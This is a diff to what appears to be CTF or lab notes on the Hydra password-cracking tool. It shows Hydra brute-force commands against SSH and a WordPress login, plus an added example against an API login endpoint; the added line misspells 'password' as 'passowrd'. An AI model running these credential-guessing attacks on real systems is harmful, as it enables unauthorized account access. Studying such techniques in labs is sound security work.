@@ -53,6 +53,10 @@ hydra -l molly -P rockyou.txt 10.10.10.10 ssh -V -I -t 8 -w 5 -W 10 -e nsr -u -s
 hydra -l elliot -P rockyou.txt 10.10.10.10 http-post-form \
       "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
       -V -I -t 32
+      
+#OR OTHER EXAMPLE :
+
+hydra -l james -P custom_passwords.txt 10.114.155.220 http-post-form "/api/user/login:username=^USER^&passowrd=^PASS^ : Invalid Username Or Password"
 ```
 
 **Flags explained**:
